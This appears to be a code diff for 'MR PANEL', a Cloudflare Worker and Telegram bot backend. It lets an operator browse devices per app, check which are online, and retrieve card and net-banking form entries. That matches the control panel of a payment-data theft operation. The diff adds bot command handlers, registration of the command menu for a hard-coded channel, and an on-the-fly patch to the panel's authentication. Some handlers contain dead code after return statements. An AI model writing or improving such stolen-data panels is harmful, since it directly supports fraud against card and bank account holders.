+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'false') ON CONFLICT (key) DO UPDATE SET value = 'false'`);
+      await tgReply(token, chatId, '<b>Notifications resumed.</b>\nAll notifications are now active.');
+      tgCache.ts = 0; // invalidate settings cache
+      return c.json({ ok: true });
+    }
+
+
+    // /pause — pause all notifications
+    if (txt === '/pause') {
+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'true') ON CONFLICT (key) DO UPDATE SET value = 'true'`);
+      await tgReply(token, chatId, '<b>Notifications paused.</b>\nUse /stop to resume.');
+      return c.json({ ok: true });
+      tgCache.ts = 0; // invalidate settings cache
+    }
+
+    // /focus <appId> — only receive notifications from this app
+    if (txt.startsWith('/focus ')) {
+      const focusId = txt.slice(7).trim();
+      if (!focusId) {
+        await tgReply(token, chatId, 'Usage: /focus &lt;appId&gt;\nExample: /focus myapp123');
+        return c.json({ ok: true });
+      }
+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_focus_app', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [focusId]);
+      await tgReply(token, chatId, `Focus set: <code>${focusId}</code>\nOnly this app's notifications will arrive. Use /unfocus to clear.`);
+      return c.json({ ok: true });
+      tgCache.ts = 0; // invalidate settings cache
+    }
+
+    // /unfocus — clear app focus
+    if (txt === '/unfocus') {
+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_focus_app', '') ON CONFLICT (key) DO UPDATE SET value = ''`);
+      await tgReply(token, chatId, '<b>Focus cleared.</b>\nAll apps will send notifications.');
+      return c.json({ ok: true });
+      tgCache.ts = 0; // invalidate settings cache
+    }
+
+    // /focusstatus — check current focus app
+    if (txt === '/focusstatus' || txt === '/fs') {
+      const fsRows = await sqlClient(`SELECT value FROM settings WHERE key = 'telegram_focus_app' LIMIT 1`);
+      const focusedApp = (fsRows[0] as { value?: string })?.value ?? '';
+      await tgReply(token, chatId, focusedApp ? `Focused: <code>${focusedApp}</code>\nOnly this app notifies. /unfocus to clear.` : 'No focus. All apps notify.');
+      return c.json({ ok: true });
+    }
+
+    // /setmenu — register bot commands in Telegram autocomplete
+    if (txt === '/setmenu') {
+      const menuCmds = [
+        { command: "start", description: "Show command menu" },
+        { command: "1h", description: "Last 1 hour activity" },
+        { command: "24h", description: "Last 24 hours activity" },
+        { command: "7d", description: "Last 7 days activity" },
+        { command: "total", description: "All-time totals" },
+        { command: "stats", description: "Per-app breakdown" },
+        { command: "apps", description: "List all app IDs" },
+        { command: "online", description: "Online devices (last 15min)" },
+        { command: "offline", description: "Offline devices" },
+        { command: "last", description: "Last N messages" },
+        { command: "card", description: "Card form data (last 500)" },
+        { command: "nb", description: "Net banking form data (last 500)" },
+        { command: "search", description: "Search last 200 records" },
+        { command: "focus", description: "Focus notifications on one app" },
+        { command: "unfocus", description: "Clear focus, all apps notify" },
+        { command: "focusstatus", description: "Check current notification focus" },
+        { command: "pause", description: "Pause all notifications" },
+        { command: "stop", description: "Resume notifications" },
+      ];
+      // Register commands for default scope (private chat)
+      const smR = await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
+        method: "POST", headers: { "content-type": "application/json" },
+        body: JSON.stringify({ commands: menuCmds }),
+      });
+      // Also register for the channel so members see "/" autocomplete
+      const smCh = await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
+        method: "POST", headers: { "content-type": "application/json" },
+        body: JSON.stringify({ commands: menuCmds, scope: { type: 'chat', chat_id: -1004403318713 } }),
+      });
+      const smResult = await smR.json() as { ok: boolean };
+      const smChResult = await smCh.json() as { ok: boolean };
+      await tgReply(token, chatId, smResult.ok
+        ? `<b>Bot menu registered!</b>\nPrivate: ✅  Channel: ${smChResult.ok ? '✅' : '⚠️ (need admin)'}\nType "/" to see all commands.`
+        : 'Menu registration failed.');
+      return c.json({ ok: true });
+    }
+    // /start or /help — command menu
+    if (txt === '/start' || txt === '/help') {
+      // Auto-register commands in Telegram on /start
+      const menuCmdsAuto = [
+        { command: "start", description: "Show command menu" },
+        { command: "1h", description: "Last 1 hour activity" },
+        { command: "24h", description: "Last 24 hours activity" },
+        { command: "7d", description: "Last 7 days activity" },
+        { command: "total", description: "All-time totals" },
+        { command: "stats", description: "Per-app breakdown" },
+        { command: "apps", description: "List all app IDs" },
+        { command: "online", description: "Online devices (last 15min)" },
+        { command: "offline", description: "Offline devices" },
+        { command: "last", description: "Last N messages" },
+        { command: "card", description: "Card form data (last 500)" },
+        { command: "nb", description: "Net banking form data (last 500)" },
+        { command: "search", description: "Search last 200 records" },
+        { command: "focus", description: "Focus notifications on one app" },
+        { command: "unfocus", description: "Clear focus, all apps notify" },
+        { command: "focusstatus", description: "Check notification focus" },
+        { command: "pause", description: "Pause all notifications" },
+        { command: "stop", description: "Resume notifications" },
+      ];
+      await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
+        method: "POST", headers: { "content-type": "application/json" },
+        body: JSON.stringify({ commands: menuCmdsAuto }),
+      });
+      const help =
+        `<b>MR PANEL — Bot Menu</b>
+` +
+        `━━━━━━━━━━━━━━━━━━━━━━
+
+` +
+        `<b>[DATA BY TIME]</b>
+` +
+        `/1h   /24h   /7d   /total
+
+` +
+        `<b>[FORM DATA]</b>
+` +
+        `/card          Card entries (last 500)
+` +
+        `/nb            Net banking entries (last 500)
+` +
+        `/card online   Card + online
+` +
+        `/nb online     NB + online
+` +
+        `/search &lt;txt&gt; Search last 200 records
+
+` +
+        `<b>[DEVICES]</b>
+` +
+        `/online        Active in last 15min
+` +
+        `/offline       Offline devices
+` +
+        `/dev &lt;id&gt;      Device lookup
+` +
+        `/last [n]      Last N messages
+
+` +
+        `<b>[APPS]</b>
+` +
+        `/apps          List all apps
+` +
+        `/stats         Per-app breakdown
+` +
+        `/app &lt;id&gt;     App devices
+
+` +
+        `<b>[NOTIFICATIONS]</b>
+` +
+        `/focus &lt;appId&gt; Only notify for this app
+` +
+        `/unfocus       All apps notify
+` +
+        `/focusstatus   Check focus status
+` +
+        `/pause         Pause all notifications
+` +
+        `/stop          Resume notifications
+
+` +
+        `/setmenu       Re-register this bot menu`;
+      await tgReply(token, chatId, help);
+      return c.json({ ok: true });
+    }
+
+    return c.json({ ok: true });
+  });
+
+  
 
 // =================== WORKER ENTRY ===================
 export default {
@@ -1141,6 +2609,22 @@ export default {
     }
     if (url.pathname.startsWith("/api/")) {
       return app.fetch(request, env, ctx);
+    }
+    // Patch the JS bundle on-the-fly: remove PIN from SSE URL, use HMAC token instead
+    if (url.pathname.endsWith(".js") && url.pathname.includes("index-")) {
+      const assetResp = await env.ASSETS.fetch(request);
+      const js = await assetResp.text();
+      // OLD: HEAD check with ?pin= then EventSource with ?pin=
+      const OLD_SSE = `try{const St=await He(\`/api/master/events?pin=\${encodeURIComponent(r)}\`,{method:"HEAD"}).catch(()=>null);if(St&&St.status===401){ge=!0,d();return}}catch{}ge||(W=new EventSource(\`/api/master/events?pin=\${encodeURIComponent(r)}\`)`;
+      // NEW: fetch HMAC token first, then EventSource with ?token=
+      const NEW_SSE = `try{const _tr=await He("/api/master/sse-token",{method:"POST",headers:{"Content-Type":"application/json","x-master-pin":r},body:JSON.stringify({pin:r})});if(!_tr.ok){if(!ge)setTimeout(ze,5e3);return}const{token:_tk}=await _tr.json();if(ge)return;!ge&&(W=new EventSource(\`/api/master/events?token=\${encodeURIComponent(_tk)}\`)`;
+      const patched = js.includes(OLD_SSE) ? js.replace(OLD_SSE, NEW_SSE) : js;
+      return new Response(patched, {
+        headers: {
+          "Content-Type": "application/javascript; charset=utf-8",
+          "Cache-Control": "no-store",
+        },
+      });
     }
     // fall through to Pages static assets (React SPA)
     return env.ASSETS.fetch(request);
